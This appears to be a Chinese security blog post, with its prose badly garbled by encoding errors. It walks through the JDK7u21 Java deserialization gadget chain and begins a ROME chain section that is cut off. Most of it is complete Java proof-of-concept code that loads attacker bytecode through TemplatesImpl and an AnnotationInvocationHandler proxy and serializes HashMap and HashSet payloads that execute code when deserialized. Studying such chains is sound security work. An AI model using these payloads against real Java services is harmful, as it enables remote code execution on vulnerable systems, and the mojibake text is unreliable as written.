ï¼š\næ€è€ƒä¸€ä¸‹ï¼Œç¬¬ä¸€ä¸ªå€¼å°±æ˜¯ç›´æ¥è°ƒç”¨å®ƒçš„hashCode()æ–¹æ³•ï¼Œç¬¬äºŒä¸ªputè¿›çš„å€¼éœ€è¦ä¸ºä»£ç†å¯¹è±¡ã€‚å…ˆè·Ÿç¬¬äºŒä¸ªé”®å€¼å¯¹çš„è®¡ç®—æ–¹æ³•ï¼š ç”±äºæˆ‘ä»¬ä¼ å…¥çš„kæ˜¯AnnotationInvocationHandleä»£ç†å¯¹è±¡ï¼Œæ‰€ä»¥è¿™é‡Œè°ƒç”¨hashCode()æ–¹æ³•å°±ä¼šåˆ°AnnotationInvocationHandlerç±»çš„invoke()æ–¹æ³•ï¼Œå°±ä¼šè°ƒç”¨åˆ°hashCodeImpl()æ–¹æ³•ï¼š\nè·Ÿè¿›è¿™ä¸ªhashCodeImpl()æ–¹æ³•ï¼š è¿™ä¸ªæ–¹æ³•å£°æ˜äº†ä¸€ä¸ªMap.Entryç±»å‹çš„var3ï¼Œç„¶ååˆ›å»ºäº†ä¸€ä¸ªè¿­ä»£å™¨var2ï¼Œç”¨äºéå†this.memberrValueså˜é‡çš„æ¡ç›®é›†ï¼Œæ‰€ä»¥è¿™é‡Œçš„membeValuesåº”è¯¥ä¸ºä¸€ä¸ªMapå¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸ªHashMapå®ä¾‹æ¥ä»£è¡¨ã€‚\nå¦‚æœ membeValues åªæœ‰ä¸€ä¸ªé”®å€¼å¯¹ï¼Œè¯¥hashå°±ç­‰äº127 * key.hashCode() ^ value.hashCode()ï¼Œè€Œå½“key.hashCodeä¸º0ï¼Œä»»ä½•æ•°å¼‚æˆ–0çš„ç»“æœä»æ˜¯ä»–æœ¬èº«ï¼š åœ¨ysoserialé¡¹ç›®æä¾›äº†ä¸€ä¸ªå­—ç¬¦ä¸²f5a5a608ï¼Œå…¶hashCodeå€¼æ­£å¥½ä¸º0ã€‚æ‰€ä»¥è¯¥hashè®¡ç®—å¯ä»¥ç®€åŒ–æˆvalue.hashCodeï¼Œ\né‡ç‚¹æ¥äº†ï¼Œå‰é¢æˆ‘ä»¬è¯´è¿‡äº†putè¿›çš„ç¬¬ä¸€ä¸ªå€¼éœ€è¦ä¸ºTemplatesImplç±»çš„å®ä¾‹ï¼Œæ‰€ä»¥å‰é¢åœ¨è®¡ç®—hashå€¼è°ƒç”¨çš„hash()æ–¹æ³•ä¸­ï¼Œè®¡ç®—æ–¹å¼å°±æ˜¯templatesImpl.hashCode()ã€‚\nè€Œåªè¦æˆ‘ä»¬å°†valueè®¾ç½®ä¸ºTemplatesImplå¯¹è±¡ï¼Œå°±èƒ½å®ç°Proxy.hashCodeç­‰äºTemplatesImpl.hashCodeï¼Œä¹Ÿå°±æ˜¯ç¬¬äºŒä¸ªçš„è®¡ç®—æ–¹å¼ä¹Ÿæ˜¯templatesImpl.hashCode()ã€‚\nè¿™æ ·å°±èƒ½æˆåŠŸé€šè¿‡hashå€¼ç›¸åŒçš„é—®é¢˜ã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\né—®é¢˜è§£å†³ï¼Œå°è¯•æ„é€ ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 package jdk.local; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.HashMap; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.lang.reflect.Constructor; import java.util.Map; import javax.xml.transform.Templates; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; import java.io.FileOutputStream; public class Main{ public static void main(String[] main) throws Exception{ byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\jdk\\\\local\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); HashMap hashMap = new HashMap(); hashMap.put(\u0026#34;f5a5a608\u0026#34;,ctf); Constructor constructor1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler instance = (InvocationHandler)constructor1.newInstance(Templates.class,hashMap); Class[] interfaces = ctf.getClass().getInterfaces(); Templates proxy = (Templates)Proxy.newProxyInstance(Templates.class.getClassLoader(),interfaces,instance); HashMap hash = new HashMap(); hash.put(ctf,111); hash.put(proxy,111); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } å¼¹å‡ºä¸€ä¸ªè®¡ç®—æœºã€‚çœ‹äº†ä¸€ä¸‹ï¼Œç¡®å®æ˜¯åºåˆ—åŒ–ä¹‹å‰é€ æˆçš„ï¼ŒHashMapçš„put()ä¼šè°ƒç”¨ï¼Œè€ç”Ÿå¸¸è°ˆäº†ï¼š è§£å†³æ–¹æ³•å°±æ˜¯å°†æœ€å¼€å§‹åŠ å…¥templatesImplç±»å®ä¾‹çš„åœ°æ–¹ä¸è¦åŠ å…¥ï¼Œè®©hashå€¼ç›´æ¥ä¸ç›¸åŒï¼š\næ”¹æˆä¸‹é¢çš„POCè¯•è¯•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 package jdk.local; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.HashMap; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.lang.reflect.Constructor; import java.util.Map; import javax.xml.transform.Templates; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; import java.io.FileOutputStream; public class Main{ public static void main(String[] main) throws Exception{ byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\jdk\\\\local\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); HashMap hashMap = new HashMap(); //è¿™ä¸ªä¸èƒ½åˆ ï¼Œå†è°ƒç”¨ä¸€æ¬¡ä¿®æ”¹å€¼å³å¯ hashMap.put(\u0026#34;f5a5a608\u0026#34;,\u0026#34;fupanc\u0026#34;); Constructor constructor1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler instance = (InvocationHandler)constructor1.newInstance(Templates.class,hashMap); Class[] interfaces = ctf.getClass().getInterfaces(); Templates proxy = (Templates)Proxy.newProxyInstance(Templates.class.getClassLoader(),interfaces,instance); HashMap hash = new HashMap(); hash.put(ctf,111); hash.put(proxy,111); hashMap.put(\u0026#34;f5a5a608\u0026#34;,ctf); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } è¿˜æ˜¯ä¸è¡Œï¼Œçœ‹äº†ä¸€ä¸‹å…¶ä»–å¸ˆå‚…çš„æ–‡ç« ï¼Œè¯´æ˜¯åœ¨æœ€åçš„HashMapä¸­æ”¾å…¥ctfå’Œproxyæ—¶è°ƒæ¢ä¸€ä¸‹ä½ç½®å³å¯ï¼Œå³å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 package java_foundation; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.HashMap; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.lang.reflect.Constructor; import java.util.Map; import javax.xml.transform.Templates; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; import java.io.FileOutputStream; public class Main{ public static void main(String[] main) throws Exception{ byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); HashMap hashMap = new HashMap(); hashMap.put(\u0026#34;f5a5a608\u0026#34;,ctf); Constructor constructor1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler instance = (InvocationHandler)constructor1.newInstance(Templates.class,hashMap); Class[] interfaces = ctf.getClass().getInterfaces(); Templates proxy = (Templates)Proxy.newProxyInstance(Templates.class.getClassLoader(),interfaces,instance); HashMap hash = new HashMap(); hash.put(proxy,111); hash.put(ctf,111); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } è¿è¡Œè°ƒè¯•åå‘ç°ç¡®å®æ˜¯ååºåˆ—åŒ–æ—¶å¼¹å‡ºæ¥çš„è®¡ç®—æœºï¼Œå¹¶ä¸”åœ¨åºåˆ—åŒ–ä¹‹å‰ä¹Ÿæ²¡æœ‰å¼¹å‡ºè®¡ç®—æœºã€‚\nâ€”â€”â€”â€”\nåé¢æƒ³äº†ä¸€ä¸‹ï¼Œè¿™æ ·ä¸å°±ä¸ä¹‹å‰åˆ†æçš„ä¸ä¸€æ ·äº†å—ã€‚ç™¾æ€ä¸å¾—å…¶è§£ã€‚\nç„¶åå°±ä¸€ç›´è°ƒè¯•ï¼Œæœ€ååœ¨å‘ç°ï¼Œå®åœ¨ååºåˆ—åŒ–æ—¶å‡ºç°äº†é—®é¢˜ã€‚\nHashMapååºåˆ—åŒ–æ—¶çš„é—®é¢˜ï¼š\nä»ä»£ç ä¸­å¯ä»¥çŸ¥é“ï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ªæ”¾å…¥é”®å€¼å¯¹çš„åœ°æ–¹ï¼Œä½†æ˜¯æˆ‘æƒ³å½“ç„¶åœ°æƒ³ç€è¿™é‡Œä¼šæŒ‰ç…§é¡ºåºæ¥æ”¾å…¥é”®å€¼å¯¹ï¼Œè°ƒè¯•å¦‚ä¸‹ï¼ˆä»¥ä¸Šé¢æ­£ç¡®çš„ä»£ç ä¸ºä¾‹ï¼‰ï¼š\nå…ˆæ”¾å…¥çš„é”®å€¼å¯¹å¦‚ä¸‹ï¼š\nç„¶åç»§ç»­å†ä¸€æ¬¡æ–­äºè¿™ä¸ªç‚¹ï¼Œæ”¾å…¥çš„é”®å€¼å¯¹å¦‚ä¸‹ï¼š\nä¹Ÿå°±æ˜¯proxyä¸­å­˜åœ¨çš„hashMapã€‚\nç„¶åç»§ç»­å†ä¸€æ¬¡æ–­äºè¿™ä¸ªç‚¹ï¼Œé”®å€¼å¯¹å¦‚ä¸‹ï¼š\nå¯ä»¥çœ‹åˆ°æœ€åæ‰æ˜¯è¿™ä¸ªproxyï¼Œè€Œæˆ‘ä»¬çš„æ”¾å…¥çš„æ“ä½œä¸ºï¼š æ˜¯å…ˆæ”¾å…¥çš„proxyå†æ”¾å…¥çš„ctfï¼Œä½†æ˜¯è¿™é‡Œçš„ååºåˆ—åŒ–æ—¶çš„é¡ºåºæ˜¯ä¸ä¸€æ ·çš„ï¼Œæˆ‘ä»¬æƒ³åˆ©ç”¨çš„ä»£ç å¦‚ä¸‹ï¼š\næ‰€ä»¥æ˜¯éœ€è¦keyä¸ºproxyä»£ç†å¯¹è±¡çš„ï¼Œä½†æ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„é¡ºåºæ˜¯ä¸åŒçš„ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦å…ˆæ”¾å…¥proxyï¼Œåæ”¾å…¥ctfï¼Œè¿™æ ·ï¼Œä¹Ÿå°±ä¸ä¼šå¯¼è‡´åºåˆ—åŒ–ä¹‹å‰çš„å¼¹è®¡ç®—æœºäº†ã€‚\nå¦‚æœæŒ‰ç…§ä¹‹å‰çš„é¡ºåºï¼Œé‚£ä¹ˆç¡®å®æ˜¯ä¼šåœ¨åºåˆ—åŒ–ä¹‹å‰å¼¹å‡ºè®¡ç®—æœºï¼Œç¬¦åˆå¼¹è®¡ç®—æœºçš„æ¡ä»¶ã€‚\nä½†æ˜¯åœ¨ååºåˆ—åŒ–æ—¶ï¼ŒHashMapçš„é¡ºåºå°±æ˜¯ hashMapé‡Œçš„é”®å€¼å¯¹ ==ã€‹hashä¸­çš„proxy é”®å€¼å¯¹ ==\u0026gt;hashä¸­çš„ctf(TemplatesImplé”®å€¼å¯¹)ã€‚å¹¶ä¸”è°ƒè¯•åä¹Ÿç¬¦åˆæƒ…å†µã€‚\nç„¶åæˆ‘åœ¨JDK8ä¹Ÿè¯•äº†ä¸€ä¸‹ï¼Œä¹Ÿæ˜¯å…ˆååºåˆ—åŒ–çš„ç¬¬äºŒä¸ªé”®å€¼å¯¹ï¼Œä½†æ˜¯æµ‹è¯•çš„é”®å€¼å¯¹éƒ½æ˜¯ä»¥ä¸€ä¸ªç±»å®ä¾‹ä¸ºkeyï¼Œé—®äº†ä¸€ä¸‹ï¼ŒåŸå› å¤§æ¦‚å¦‚ä¸‹ï¼š\nè¿™ä¸ªæ˜¯å› ä¸ºHashMapåºåˆ—åŒ–å’Œååºåˆ—åŒ–æ—¶æœ¬èº«å…¶é¡ºåºå°±å¯èƒ½ä¸åŒï¼Œå…¶é¡ºåºæ—¶åŸºäºå“ˆå¸Œå€¼æ¥å†³å®šçš„ï¼Œæ‰€ä»¥è¿™é‡Œå¯èƒ½å°±ä¸ç¯å¢ƒæœ‰å…³äº†ã€‚ä¹Ÿè®¸åœ¨æŸä¸ªç¯å¢ƒæˆ‘æœ€å¼€å§‹çš„é‚£ä¸ªå…ˆæ”¾å…¥fupancå†ä¿®æ”¹ä¸ºctfçš„æ–¹æ³•ä¹Ÿæ˜¯æœ‰ç”¨çš„å‘¢ï¼ˆåæ­£åˆšå­¦çš„æ—¶å€™åº”è¯¥æ˜¯å¯ä»¥çš„ï¼Œè¿™é‡Œå†é‡çœ‹çš„æ—¶å€™ä¸è¡Œäº†ï¼‰ã€‚åæ­£å¤šè¯•ã€‚\nä¸ºäº†éªŒè¯æƒ³æ³•ï¼Œä½¿ç”¨å¦‚ä¸‹POCæ¥éªŒè¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import java.util.HashMap; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; import java.io.FileOutputStream; public class Main{ public static void main(String[] main) throws Exception{ // TemplatesImpl ctf = new TemplatesImpl(); // // HashMap hashMap = new HashMap(); HashMap hash = new HashMap(); hash.put(\u0026#34;fupanc1\u0026#34;,111); hash.put(\u0026#34;fupanc2\u0026#34;,111); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } è¿™æ ·åœ¨ååºåˆ—åŒ–æ—¶å°±æ˜¯å…ˆæ”¾å…¥çš„ç¬¬ä¸€ä¸ªï¼Œå†æ”¾å…¥çš„ç¬¬äºŒä¸ªã€‚\nâ€”â€”â€”â€”â€”â€”\nåŸºäºç°åœ¨çš„æƒ…å†µï¼Œé‚£ä¹ˆç°åœ¨åºåˆ—åŒ–å‰çš„æµç¨‹è‚¯å®šä¹Ÿè¦å˜ï¼Œç®€å•è·Ÿä¸€ä¸‹ï¼š è¿˜æ˜¯ç›´æ¥æ–­äºhashä¸­ç¬¬äºŒæ¬¡æ”¾å…¥é”®å€¼å¯¹çš„ä»£ç ï¼Œå¦‚ä¸‹ï¼š\nå¯ä»¥çŸ¥é“è¿™é‡Œçš„hashå€¼æ—¶è‚¯å®šç›¸åŒçš„ï¼Œå…·ä½“æµç¨‹å’Œä¹‹å‰åˆ†æçš„ä¸ä¸€æ ·ï¼Œä½†æ˜¯æ­¤æ—¶çš„è°ƒç”¨equals()æ–¹æ³•å°±æœ‰åŒºåˆ«äº†ï¼Œè¿™é‡Œçš„TemplatesImplç±»æ²¡æœ‰å®šä¹‰equals()æ–¹æ³•ï¼Œè¿™é‡Œä¼šç›´æ¥è°ƒç”¨åˆ°Object.javaç±»çš„equals()æ–¹æ³•ï¼š\nä»å˜é‡çš„å€¼æ¥çœ‹ï¼Œè¿™é‡Œæ˜¯ä¼šè¿”å›falseçš„ï¼Œç„¶åç›´æ¥å°±ä¼šæˆåŠŸæ”¾å…¥ç¬¬äºŒä¸ªé”®å€¼å¯¹ã€‚\næ‰€ä»¥æœ€ç»ˆçš„POCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 package java_foundation; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.HashMap; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.lang.reflect.Constructor; import java.util.Map; import javax.xml.transform.Templates; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; import java.io.FileOutputStream; public class Main{ public static void main(String[] main) throws Exception{ byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); HashMap hashMap = new HashMap(); hashMap.put(\u0026#34;f5a5a608\u0026#34;,ctf); Constructor constructor1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler instance = (InvocationHandler)constructor1.newInstance(Templates.class,hashMap); Class[] interfaces = ctf.getClass().getInterfaces(); Templates proxy = (Templates)Proxy.newProxyInstance(Templates.class.getClassLoader(),interfaces,instance); HashMap hash = new HashMap(); hash.put(proxy,111); hash.put(ctf,111); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } HashSet HashSetæœ¬æ¥å°±å’ŒHashMapå·®ä¸å¤šï¼Œå¹¶ä¸”ååºåˆ—åŒ–æ—¶ä¹Ÿæ˜¯å…ˆååºåˆ—åŒ–çš„ç¬¬äºŒä¸ªé”®å€¼å¯¹ã€‚readObjectå†…å®¹ä¸ºï¼š\nå¯ä»¥çœ‹åˆ°å…¶å®å°±æ˜¯è°ƒç”¨çš„HashMapçš„put()æ–¹æ³•ï¼Œè¿™ä¸ªä¹Ÿæ˜¯å‰é¢åˆ†æè¿‡äº†çš„ï¼Œæœ€ç»ˆPOCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 package java_foundation; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.lang.reflect.Constructor; import java.util.Map; import javax.xml.transform.Templates; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; import java.io.FileOutputStream; public class Main{ public static void main(String[] main) throws Exception{ byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); HashMap hashMap = new HashMap(); hashMap.put(\u0026#34;f5a5a608\u0026#34;,ctf); Constructor constructor1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler instance = (InvocationHandler)constructor1.newInstance(Templates.class,hashMap); Class[] interfaces = ctf.getClass().getInterfaces(); Templates proxy = (Templates)Proxy.newProxyInstance(Templates.class.getClassLoader(),interfaces,instance); HashSet hash = new HashSet(); hash.add(proxy); hash.add(ctf); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æˆåŠŸåœ¨ååºåˆ—åŒ–æ—¶å¼¹è®¡ç®—æœºã€‚\nå…¶å®åœ¨å¯ä»¥åˆ©ç”¨equals()æ–¹æ³•çš„åœ°æ–¹ï¼Œåªè¦JDKç‰ˆæœ¬ç¬¦åˆ \u0026lt;= 7u21 ï¼Œéƒ½è¦æƒ³åˆ°è¿™ä¸ªåŸç”Ÿé“¾ï¼Œæ¯”å¦‚ROMEé“¾çš„ç¬¬ä¸‰æ¡å°±æœ‰ç”¨åˆ°equals()æ–¹æ³•ï¼Œå¤§åŒå°å¼‚ã€‚\n","date":"2025-01-22T14:14:01+08:00","permalink":"https://fupanc-w1n.github.io/p/jdk7u21%E5%8E%9F%E7%94%9F%E9%93%BE/","title":"JDK7u21åŸç”Ÿé“¾"},{"content":"Romeé“¾ RMOE æ˜¯ä¸€ä¸ªç”¨äºRSS å’Œ Atom è®¢é˜…çš„Javaæ¡†æ¶ã€‚å®ƒæ˜¯å¼€æºçš„ã€‚\nå®ƒæ˜¯ä¸€ä¸ªå¯ä»¥å…¼å®¹å¤šç§æ ¼å¼çš„ feeds è§£æå™¨ï¼Œå¯ä»¥ä»ä¸€ç§æ ¼å¼è½¬æ¢æˆå¦ä¸€ç§æ ¼å¼ï¼Œä¹Ÿå¯è¿”å›æŒ‡å®šæ ¼å¼æˆ–Javaå¯¹è±¡ã€‚\nç¯å¢ƒå‡†å¤‡ ç¯å¢ƒä¾èµ–ï¼š\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;rome\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;rome\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; æµ‹è¯•ç¯å¢ƒï¼š\nJDK 8u411 rome 1.0 éœ€è¦äº†è§£çš„ç±» ToStringBean è¿™ä¸ªç±»ä½äºcom.sun.syndication.feed.impl.ToStringBeanï¼Œè¿™ä¸ªç±»ä¸»è¦å°±æ˜¯çœ‹ä»–çš„toStringæ–¹æ³•ã€‚\nä»–æœ‰ä¸¤ä¸ªtoStirng()æ–¹æ³•ï¼Œå‰ä¸€ä¸ªæ˜¯æ— å‚çš„publicç±»å‹çš„æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public String toString() { Stack stack = (Stack)PREFIX_TL.get(); String[] tsInfo = (String[])(stack.isEmpty() ? null : stack.peek()); String prefix; if (tsInfo == null) { String className = this._obj.getClass().getName(); prefix = className.substring(className.lastIndexOf(\u0026#34;.\u0026#34;) + 1); } else { prefix = tsInfo[0]; tsInfo[1] = prefix; } return this.toString(prefix); } åé¢ä¸€ä¸ªå°±æ˜¯æœ‰å‚çš„privateç±»å‹çš„æ–¹æ³•ï¼Œæºä»£ç ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 private String toString(String prefix) { StringBuffer sb = new StringBuffer(128); try { PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(this._beanClass); if (pds != null) { for(int i = 0; i \u0026lt; pds.length; ++i) { String pName = pds[i].getName(); Method pReadMethod = pds[i].getReadMethod(); if (pReadMethod != null \u0026amp;\u0026amp; pReadMethod.getDeclaringClass() != Object.class \u0026amp;\u0026amp; pReadMethod.getParameterTypes().length == 0) { Object value = pReadMethod.invoke(this._obj, NO_PARAMS); this.printProperty(sb, prefix + \u0026#34;.\u0026#34; + pName, value); } } } } catch (Exception var8) { sb.append(\u0026#34;\\n\\nEXCEPTION: Could not complete \u0026#34; + this._obj.getClass() + \u0026#34;.toString(): \u0026#34; + var8.getMessage() + \u0026#34;\\n\u0026#34;); } return sb.toString(); } å…ˆç®€å•äº†è§£ä¸€ä¸‹ï¼Œåé¢å†ç»†è¯´ã€‚\nObjectBean è¿™ä¸ªç±»ä½äºcom.sun.syndication.feed.impl.ObjectBeanï¼Œå®ƒæ˜¯Rome æä¾›çš„ä¸€ä¸ªå°è£…ç±»å‹ï¼Œåˆå§‹åŒ–æ—¶æä¾›äº†ä¸€ä¸ª Class ç±»å‹å’Œä¸€ä¸ªObject å¯¹è±¡å®ä¾‹è¿›è¡Œå°è£…ï¼š ç°åœ¨ç€é‡äºçœ‹è¿™ä¸ªç±»ä¸­çš„æ–¹æ³•ï¼Œè¿™é‡Œæœ‰ä¸‰ä¸ªæ–¹æ³•å¯ä»¥åˆ©ç”¨ï¼Œä¸‹é¢åˆ†åˆ«è¯´æ˜ä¸€ä¸‹ï¼š\ntoString() ObjectBeanç±»çš„toString()æ–¹æ³•æºä»£ç å¦‚ä¸‹ï¼š\næ‰€ä»¥è¿™é‡Œä¼šè°ƒç”¨ToStringBeanç±»çš„toString()æ–¹æ³•ï¼Œå‰é¢è¯´è¿‡ToStringBeanæ¥æœ‰ä¸¤ä¸ªtoString()æ–¹æ³•ï¼Œè¿™é‡Œæ˜¯æ²¡æœ‰ä¼ 